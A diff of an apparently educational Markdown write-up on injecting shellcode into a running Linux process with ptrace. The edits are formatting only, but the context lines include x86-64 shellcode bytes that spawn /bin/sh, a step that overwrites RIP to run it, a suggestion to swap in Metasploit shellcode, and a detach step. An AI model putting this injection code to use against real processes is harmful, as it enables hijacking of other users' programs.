@@ -38,6 +38,7 @@ unsigned char shellcode[] = {
   0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
   0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
   0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
+
 };
 
 ```
@@ -68,6 +69,7 @@ unsigned char shellcode[] = {
   0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
   0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
   0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
+
 };
 
 size_t shellcodeLen = sizeof(shellcode);
@@ -95,7 +97,7 @@ if (argc < 2) { // If args count is less than 2 (1st is the binary path)
 // Convert char* from argv to int (unsafe) and cast to pid_t
 pid_t procID = (pid_t)atoi(argv[1]); // atoi do the conversion, but is unsafe, the convention is using strtol instead of atoi
 if (procID <= 0) {
-    fprintf(stderr, "Invalid PID");
+    fprintf(stderr, "Invalid PID\n");
     return 1;
 
 }
@@ -168,7 +170,7 @@ unsigned long address = regs.rip; // Just get the rip from regs struct
 printf("Target RIP: 0x%llx\n", (unsigned long long)address); // Log
 ```
 
-## Overwriting the RIP
+### Overwriting the RIP
 
 Now we already can overwrite the RIP to insert our malicious shellcode (in that case, just spawn /bin/sh, but you can use a metasploit shellcode for example):
 
@@ -209,7 +211,7 @@ for (size_t i = 0; i < nWords; i++) {
 
 Injection done! Now we just need to detach the process and have fun
 
-## Detaching the process
+### Detaching the process
 
 This is the final step, we just need to detach:
 
@@ -221,7 +223,7 @@ if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) { // Very simple, i think t
 }
 ```
 
-## Error handling
+### Error handling
 
 If you really read this paper, you saw `goto detach` some times, and here is the `detach` label:
 
